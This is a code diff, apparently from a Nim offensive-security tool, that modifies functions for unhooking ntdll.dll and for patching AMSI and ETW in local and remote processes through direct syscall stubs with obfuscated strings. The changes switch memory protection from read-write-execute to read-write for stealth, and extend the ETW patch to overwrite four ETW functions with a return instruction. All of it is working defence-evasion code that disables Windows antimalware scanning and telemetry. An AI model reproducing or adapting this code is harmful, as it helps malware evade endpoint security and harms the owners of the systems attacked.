@@ -360,7 +360,7 @@ proc ntdllunhook(): bool =
           var bytesWritten: SIZE_T
           var ds: LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
           var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
-          status = NtProtectVirtualMemory(processH, &ds, &pSize, 0x40, &oldProtection)
+          status = NtProtectVirtualMemory(processH, &ds, &pSize, 0x04, &oldProtection)
           if status != 0:
             echo obf("[!] NtProtectVirtualMemory failed to modify memory permissions:") & fmt"{GetLastError()}."
             return false
@@ -442,7 +442,7 @@ proc PatchAmsi(): bool =
     success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
     success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
     var friendlycodeLength = cast[SIZE_T](patch.len)
-    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
+    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
     if (success != 0):
         echo obf("NtProtectVirtualMemory failed")
         return disabled
@@ -487,6 +487,7 @@ proc Patchntdll(): bool =
         op: ULONG
         t: ULONG
         disabled: bool = false
+        PatchAPIs: seq[string] = @[obf("EtwNotificationRegister"), obf("EtwEventRegister"), obf("EtwEventWriteFull"), obf("EtwEventWrite")]
 
     when defined amd64:
         let patch: array[1, byte] = [byte 0xc3]
@@ -500,62 +501,64 @@ proc Patchntdll(): bool =
         echo obf("[X] Failed to load ntdll.dll")
         return disabled
 
-    when defined(DInvoke):
-        cs = MyGetProcAddress(ntdll,obf("EtwEventWrite"))
-    else:
-        cs = GetProcAddress(ntdll,obf("EtwEventWrite"))
-    if isNil(cs):
-        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
-        return disabled
+    for singleAPI in PatchAPIs:
+        echo obf("[*] Patching : "),singleAPI
 
+        when defined(DInvoke):
+            cs = MyGetProcAddress(ntdll,singleAPI)
+        else:
+            cs = GetProcAddress(ntdll,singleAPI)
+        if isNil(cs):
+            echo obf("[X] Failed to get the address of "), singleAPI
+            break
 
-    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
+        var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
 
-    var oldProtection: DWORD = 0
-    var success: BOOL
+        var oldProtection: DWORD = 0
+        var success: BOOL
 
-    # Define NtProtectVirtualMemory
-    var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
-    when defined(DInvoke):
-        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-    else:
-        success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)  
+        # Define NtProtectVirtualMemory
+        var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
+        when defined(DInvoke):
+            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+        else:
+            success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)  
 
-    # define NtWriteVirtualMemory
-    let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
-    when defined(DInvoke):
-        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-    else:
-        success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+        # define NtWriteVirtualMemory
+        let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
+        when defined(DInvoke):
+            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+        else:
+            success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
 
-    var protectAddress = cs
-    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
-    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
-    var friendlycodeLength = cast[SIZE_T](patch.len)
-    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
-    if (success != 0):
-        echo obf("NtProtectVirtualMemory failed")
-        return disabled
-    echo obf("[*] Applying Syscall ETW patch")
-    var outLength: SIZE_T
+        var protectAddress = cs
+        success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
+        success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
+        var friendlycodeLength = cast[SIZE_T](patch.len)
+        success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
+        if (success != 0):
+            echo obf("NtProtectVirtualMemory failed")
+            break
+        echo obf("[*] Applying Syscall ETW patch")
+        var outLength: SIZE_T
     
-    success = NtWriteVirtualMemory(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
+        success = NtWriteVirtualMemory(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
     
-    if (success != 0):
-        echo obf("NtWriteVirtualMemory failed")
-        return disabled
-    success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
-    if (success != 0):
-        echo obf("NtProtectVirtualMemory failed")
-        return disabled
-    else:
-        echo obf("[*] OldProtect set back")
-        disabled = true
+        if (success != 0):
+            echo obf("NtWriteVirtualMemory failed")
+            break
+        success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
+        if (success != 0):
+            echo obf("NtProtectVirtualMemory failed")
+            break
+        else:
+            echo obf("[*] OldProtect set back")
+            disabled = true
     
-    when defined(DInvoke):
-        success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
-    else:
-        success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
+        when defined(DInvoke):
+            success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
+        else:
+            success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
 
     return disabled
 
@@ -870,7 +873,7 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
     var friendlycodeLength = cast[SIZE_T](patch.len)
     var t: ULONG
     var op: ULONG
-    success = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
+    success = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
     if (success != 0):
         echo obf("NtProtectVirtualMemory for remote process failed")
         return disabled
@@ -955,7 +958,7 @@ proc RemotePatchEtw(hProcess : HANDLE) : bool =
     var friendlycodeLength = cast[SIZE_T](patch.len)
     var t: ULONG
     var op: ULONG
-    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
+    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
     if (success != 0):
         echo obf("NtProtectVirtualMemory for remote process failed")
         return disabled
